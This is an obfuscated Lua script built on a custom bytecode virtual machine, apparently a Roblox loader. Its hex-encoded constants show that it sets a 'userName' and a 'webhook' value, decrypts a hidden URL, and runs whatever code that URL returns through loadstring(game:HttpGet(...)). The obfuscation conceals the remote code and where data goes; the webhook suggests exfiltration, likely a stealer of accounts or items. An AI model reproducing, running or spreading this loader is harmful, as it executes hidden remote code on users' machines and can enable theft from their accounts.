local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 26) then
					if (Enum <= 12) then
						if (Enum <= 5) then
							if (Enum <= 2) then
								if (Enum <= 0) then
									Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
								elseif (Enum > 1) then
									VIP = Inst[3];
								else
									Stk[Inst[2]] = Stk[Inst[3]] % Stk[Inst[4]];
								end
							elseif (Enum <= 3) then
								Stk[Inst[2]]();
							elseif (Enum > 4) then
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							else
								Stk[Inst[2]] = Inst[3] + Stk[Inst[4]];
							end
						elseif (Enum <= 8) then
							if (Enum <= 6) then
								Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
							elseif (Enum > 7) then
								if not Stk[Inst[2]] then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							else
								Stk[Inst[2]] = Upvalues[Inst[3]];
							end
						elseif (Enum <= 10) then
							if (Enum > 9) then
								Stk[Inst[2]] = #Stk[Inst[3]];
							else
								local A = Inst[2];
								local Step = Stk[A + 2];
								local Index = Stk[A] + Step;
								Stk[A] = Index;
								if (Step > 0) then
									if (Index <= Stk[A + 1]) then
										VIP = Inst[3];
										Stk[A + 3] = Index;
									end
								elseif (Index >= Stk[A + 1]) then
									VIP = Inst[3];
									Stk[A + 3] = Index;
								end
							end
						elseif (Enum > 11) then
							Stk[Inst[2]] = Stk[Inst[3]];
						else
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum <= 19) then
						if (Enum <= 15) then
							if (Enum <= 13) then
								local NewProto = Proto[Inst[3]];
								local NewUvals;
								local Indexes = {};
								NewUvals = Setmetatable({}, {__index=function(_, Key)
									local Val = Indexes[Key];
									return Val[1][Val[2]];
								end,__newindex=function(_, Key, Value)
									local Val = Indexes[Key];
									Val[1][Val[2]] = Value;
								end});
								for Idx = 1, Inst[4] do
									VIP = VIP + 1;
									local Mvm = Instr[VIP];
									if (Mvm[1] == 12) then
										Indexes[Idx - 1] = {Stk,Mvm[3]};
									else
										Indexes[Idx - 1] = {Upvalues,Mvm[3]};
									end
									Lupvals[#Lupvals + 1] = Indexes;
								end
								Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
							elseif (Enum > 14) then
								local A = Inst[2];
								local Step = Stk[A + 2];
								local Index = Stk[A] + Step;
								Stk[A] = Index;
								if (Step > 0) then
									if (Index <= Stk[A + 1]) then
										VIP = Inst[3];
										Stk[A + 3] = Index;
									end
								elseif (Index >= Stk[A + 1]) then
									VIP = Inst[3];
									Stk[A + 3] = Index;
								end
							else
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							end
						elseif (Enum <= 17) then
							if (Enum == 16) then
								Stk[Inst[2]] = Inst[3] + Stk[Inst[4]];
							else
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							end
						elseif (Enum == 18) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Top)));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						else
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Stk[A + 1]));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum <= 22) then
						if (Enum <= 20) then
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 12) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						elseif (Enum > 21) then
							local A = Inst[2];
							local Index = Stk[A];
							local Step = Stk[A + 2];
							if (Step > 0) then
								if (Index > Stk[A + 1]) then
									VIP = Inst[3];
								else
									Stk[A + 3] = Index;
								end
							elseif (Index < Stk[A + 1]) then
								VIP = Inst[3];
							else
								Stk[A + 3] = Index;
							end
						else
							Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
						end
					elseif (Enum <= 24) then
						if (Enum == 23) then
							local A = Inst[2];
							local Index = Stk[A];
							local Step = Stk[A + 2];
							if (Step > 0) then
								if (Index > Stk[A + 1]) then
									VIP = Inst[3];
								else
									Stk[A + 3] = Index;
								end
							elseif (Index < Stk[A + 1]) then
								VIP = Inst[3];
							else
								Stk[A + 3] = Index;
							end
						else
							Stk[Inst[2]] = Env[Inst[3]];
						end
					elseif (Enum == 25) then
						VIP = Inst[3];
					else
						do
							return;
						end
					end
				elseif (Enum <= 39) then
					if (Enum <= 32) then
						if (Enum <= 29) then
							if (Enum <= 27) then
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							elseif (Enum > 28) then
								Stk[Inst[2]] = #Stk[Inst[3]];
							else
								Stk[Inst[2]] = {};
							end
						elseif (Enum <= 30) then
							local A = Inst[2];
							do
								return Stk[A](Unpack(Stk, A + 1, Inst[3]));
							end
						elseif (Enum > 31) then
							local A = Inst[2];
							Stk[A](Unpack(Stk, A + 1, Top));
						else
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						end
					elseif (Enum <= 35) then
						if (Enum <= 33) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Stk[A + 1]));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						elseif (Enum == 34) then
							Stk[Inst[2]] = Env[Inst[3]];
						else
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						end
					elseif (Enum <= 37) then
						if (Enum > 36) then
							Stk[Inst[2]]();
						else
							local A = Inst[2];
							do
								return Unpack(Stk, A, Top);
							end
						end
					elseif (Enum == 38) then
						Stk[Inst[2]] = {};
					else
						local A = Inst[2];
						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
					end
				elseif (Enum <= 46) then
					if (Enum <= 42) then
						if (Enum <= 40) then
							Stk[Inst[2]] = Stk[Inst[3]] + Inst[4];
						elseif (Enum > 41) then
							Stk[Inst[2]] = Upvalues[Inst[3]];
						else
							Stk[Inst[2]] = Inst[3];
						end
					elseif (Enum <= 44) then
						if (Enum == 43) then
							local A = Inst[2];
							do
								return Unpack(Stk, A, Top);
							end
						else
							Stk[Inst[2]] = Stk[Inst[3]] % Inst[4];
						end
					elseif (Enum > 45) then
						local A = Inst[2];
						Stk[A](Unpack(Stk, A + 1, Top));
					else
						Stk[Inst[2]] = Inst[3];
					end
				elseif (Enum <= 49) then
					if (Enum <= 47) then
						local A = Inst[2];
						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
					elseif (Enum == 48) then
						if not Stk[Inst[2]] then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					else
						do
							return;
						end
					end
				elseif (Enum <= 51) then
					if (Enum > 50) then
						Stk[Inst[2]] = Stk[Inst[3]];
					else
						Env[Inst[3]] = Stk[Inst[2]];
					end
				elseif (Enum == 52) then
					Env[Inst[3]] = Stk[Inst[2]];
				else
					local A = Inst[2];
					do
						return Stk[A](Unpack(Stk, A + 1, Inst[3]));
					end
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!133O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00757365724E616D6503CC3O0042395740395977267254577E473154395E71467055354C3B7C5F5822505D747850605E525A365B5D76673D67544F775675235F4F75654D372241373E396D2256364422483662227736223A402245362C226B3D2822593C39226336393B3122563731355D2244362C3875223736533D4D22533668395C226C3A4F22783A70226736573945222E362F36402226373E3971225D36413A41227D374F3864223E37733768223C37323743223936763841227B36613D34223B364D3C31226F372B22733961224F3847225036303C2303073O00776562682O6F6B03B0042O004271425079394E4653225C78512E545836257423484C78767A3849544D59724B7D3269525A62597A663E66622O4B70323A5D7A4456385D5E576B7E7747765640387E4D2C74355A533B3776225074496872485C446C515A416C2F5C4F3E5E4E54562O70365127465F4E2C557B47415B563C2B58545B647C36514C384A784F566C5041772A594A47616D636B3074445B4D713347525A34596C4B6D47663A5D6A46384320502O536D514B426A51363E5A634A48495F4F7D7B28782F3B525C2F49533C6E553C7B37554F3E2B5D3E474C5E5F37674E3F46355F3B743358746F554C7871255124563D496E3C76487153334C59676F5760352A6A5A6656377E47436A41663D46313E75686F7E5479375836775170223577485B6A57774F5F52794B4F797B4D59723E64792776664D324D2A7B3E71763855672E4E5335745D514E617B6A3A3654615A746E70223836343D45224B36593C6A2225373E383C223F3638356C224E3870225136443C3D225C36483C43226637443676226A364E3E2C2264384222493C74226B36523A382262376836322252397C2234376622323622365C2228362C222O362B39542253374D3A5B2263365822753C47225E37213532227D3E2C22613643355C22793722364A226D3654227C3678375822293734225B375D395122623E2322293733384C2253376D3A592279376C3760224936763B6F22693769224F373E362E227E3679373C222C3B44225A3B6022453E3A22463637387122763776383F226637523551222C3D4C2272375E386822303A74222536623B7B224236262O39225A373139252267363D384D2229363B3A6A225A3638374422313725377622553766352A2225376D372O225D3E7A22673B5B22413A4A227A377A394422463774352O22703728373D224A363C3954223E3B7D227C372O356D226F363C3E7122533B47227A377A395522383659366D22483777387A22723778226F3A4C22643645227C3852226F3741223036583B4322253765392O225C376F38232271363F395C227E3856222436622253363A387A2233364D363C224736743D2O22433A37223B362F3635226F362236772258365F3E332231377D3A4022463750367E2266377B3932225F363A3B4C2260377D355822503750353D22433D3F2251397D223236623C4C223B365C3A68223936563C41224D37773773222B3767222836313D39225D364E3A4522233D5B22403667356B22463635367C226739662233374638642231364D373E225F362C3C382265377835502275364A3556227D374435442248362F3865227B387D224F3767383C222C36623A46226237773A3E226637413524222O375D3531226B3758357D226D3B6822693A7922453C212273392622293A3022563653382B2247372D36402224395D222436383D5A224F3A54223F36703C3D223B37323A7C227D385A22603E7B224E3657377D227436743A25226338582245363D223036333531223A38722250373D3764227A363F374622213C632232373C394E224C367A365B2233367D354E22263B75222736723D42225B3C28226037493538226B36263546227037463675227C364C2247362B3971222F3867225C3733382E2248367D39612257362E364F225F362D2267362B3E30227336533A212236372A386222783676384622683D27030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034A3O00D9D7CF35F5E18851C3C2CC6BE1B2D316C4C1CE36E3A9C411DFD7DE2BF2F5C411DC8CE826F4B2D70AC28EEF20F4B6C21A9EF0D837EFABD30DEEE1DE31E7F4CA1FD8CD9428EBE98912C4C203083O007EB1A3BB4586DBA700264O00267O001218000100013O002023000100010002001218000200013O002023000200020003001218000300013O002023000300030004001218000400053O0006080004000B000100010004193O000B0001001218000400063O002023000500040007001218000600083O002023000600060009001218000700083O00202300070007000A00061400083O000100062O000C3O00074O000C3O00014O000C3O00054O000C3O00024O000C3O00034O000C3O00063O0012290009000C3O0012340009000B3O0012290009000E3O0012340009000D3O0012180009000F3O001218000A00103O00200E000A000A00112O0033000C00083O001229000D00123O001229000E00134O0011000C000E4O0012000A6O002F00093O00022O00030009000100012O001A3O00013O00013O00023O00026O00F03F026O00704002264O002600025O001229000300014O001D00045O001229000500013O0004170003002100012O000700076O0033000800024O0007000900014O0007000A00024O0007000B00034O0007000C00044O0033000D6O0033000E00063O002028000F000600012O0011000C000F4O002F000B3O00022O0007000C00034O0007000D00044O0033000E00014O001D000F00014O0001000F0006000F001004000F0001000F2O001D001000014O00010010000600100010040010000100100020280010001000012O0011000D00104O0012000C6O002F000A3O0002002006000A000A00022O00210009000A4O002000073O00010004090003000500012O0007000300054O0033000400024O001E000300044O002B00036O001A3O00017O00", GetFEnv(), ...);
